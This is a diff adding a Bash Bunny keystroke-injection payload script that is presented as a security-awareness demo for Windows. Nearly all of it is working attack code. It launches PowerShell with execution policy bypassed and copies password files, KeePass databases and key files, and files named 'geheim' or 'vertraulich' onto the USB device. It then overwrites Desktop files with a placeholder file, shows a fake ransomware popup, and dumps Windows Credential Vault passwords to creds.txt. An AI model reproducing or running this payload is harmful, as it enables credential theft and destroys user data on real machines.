@@ -1,0 +1,108 @@
+#!/bin/bash
+#
+# Title: 	Awareness Gathering
+# Date:		08/2020
+# Author: 	@HanseSecure
+# Version: 	1.0
+# Target: 	Windows 7+
+# Description: awareness ;-)
+# 
+#
+LED ATTACK
+ATTACKMODE HID STORAGE
+LANGUAGE='ger'
+source bunny_helpers.sh
+# Execute the powershell command in the run box with the appropriate variables
+QUACK DELAY 5000
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING powershell 
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING powershell -Exec Bypass \"cd \(\(gwmi win32_volume -f \'label=\'\'BashBunny\'\'\'\).Name+\'\\loot\\\'\)\; mkdir local-gathering \; cd local-gathering\; mkdir pw-inFile\; Get-ChildItem -Path \$env:USERPROFILE -Recurse -filter \'*.txt\' -Depth 5 -ErrorAction SilentlyContinue -Force \| Select-String \'passwor\' -List \| Copy-Item -Destination .\\pw-inFile\\. \" \; exit
+QUACK DELAY 500
+QUACK ENTER
+QUACK DELAY 500
+QUACK GUI r
+QUACK DELAY 500
+# create loot dir in temp
+QUACK STRING powershell
+QUACK DELAY 500
+QUACK ENTER
+QUACK DELAY 521
+QUACK STRING powershell -Exec Bypass \"cd \(\(gwmi win32_volume -f \'label=\'\'BashBunny\'\'\'\).Name+\'\\loot\\\'\)\; cd local-gathering\; mkdir keepass\; Get-ChildItem -Path \$env:USERPROFILE -Recurse -filter \'*.kdb*\' -Depth 5 -ErrorAction SilentlyContinue -Force \| Copy-Item -Destination .\\keepass\\. \;Get-ChildItem -Path \$env:USERPROFILE -Recurse -filter \'*.key\' -Depth 5 -ErrorAction SilentlyContinue -Force \| where name -CLike *.key \| Copy-Item -Destination .\\keepass\\. \" \; exit
+QUACK DELAY 500
+QUACK ENTER
+QUACK DELAY 500
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING powershell 
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING powershell -Exec Bypass \"cd \(\(gwmi win32_volume -f \'label=\'\'BashBunny\'\'\'\).Name+\'\\loot\\\'\)\; cd local-gathering\; mkdir passw\; Get-ChildItem -Path \$env:USERPROFILE -Recurse -filter \'*passw*\' -Depth 5 -ErrorAction SilentlyContinue -Force \| Copy-Item -Destination .\\passw\\. \" \; exit
+QUACK DELAY 500
+QUACK ENTER 
+QUACK DELAY 500
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING powershell 
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING powershell -Exec Bypass \"cd \(\(gwmi win32_volume -f \'label=\'\'BashBunny\'\'\'\).Name+\'\\loot\\\'\)\; cd local-gathering\; mkdir geheim\; Get-ChildItem -Path \$env:USERPROFILE -Recurse -filter \'*geheim*\' -Depth 5 -ErrorAction SilentlyContinue -Force \| Copy-Item -Destination .\\geheim\\. \" \; exit
+QUACK DELAY 500
+QUACK ENTER 
+QUACK DELAY 500
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING powershell 
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING powershell -Exec Bypass \"cd \(\(gwmi win32_volume -f \'label=\'\'BashBunny\'\'\'\).Name+\'\\loot\\\'\)\; cd local-gathering\; mkdir vertraulich\; Get-ChildItem -Path \$env:USERPROFILE -Recurse -filter \'*vertraulich*\' -Depth 5 -ErrorAction SilentlyContinue -Force \| Copy-Item -Destination .\\vertraulich\\. \" \; exit
+QUACK DELAY 500
+QUACK ENTER
+QUACK DELAY 500
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING powershell -WindowStyle Hidden "\"cd \$home'\Desktop'; \$h=mkdir awareness; \$h.attributes; \$h.attributes='Hidden';\""
+QUACK DELAY 500
+QUACK ENTER
+QUACK DELAY 500
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING powershell -WindowStyle Hidden "\"sleep 2;cd \$home'\Desktop'; Get-Childitem * |  %{ if(\$_.name) {copy-item \$_.name .\awareness\}};\""
+QUACK DELAY 500
+QUACK ENTER
+QUACK DELAY 500
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING powershell -WindowStyle Hidden "\"sleep 5;cd \$home'\Desktop'; Get-Childitem .\awareness\* |  %{ if(\$_.name) {copy-item ((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\${SWITCH_POSITION}\\encrypt.file') \$_.name}} \""
+QUACK DELAY 500
+QUACK ENTER
+QUACK DELAY 500
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING powershell -WindowStyle Hidden "\"\$wshell = New-Object -ComObject Wscript.Shell; \$wshell.Popup('Your data has been encrypted',0,'Game over',0x0); exit\""
+QUACK DELAY 500
+QUACK ENTER 
+QUACK DELAY 500
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING powershell 
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING \[void\]\[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime\]
+QUACK DELAY 500
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING \$vault = New-Object Windows.Security.Credentials.PasswordVault
+QUACK DELAY 500
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING cd \(\(gwmi win32_volume -f \'label=\'\'BashBunny\'\'\'\).Name+\'\\loot\\\'\)\; cd local-gathering\; \$vault.RetrieveAll\(\) \| \% \{ \$\_.RetrievePassword\(\)\;\$\_\} \| select username,resource,password \> creds.txt \; exit
+QUACK DELAY 500
+QUACK ENTER
+
+
+# Signal everything went OK - white
+LED G
+
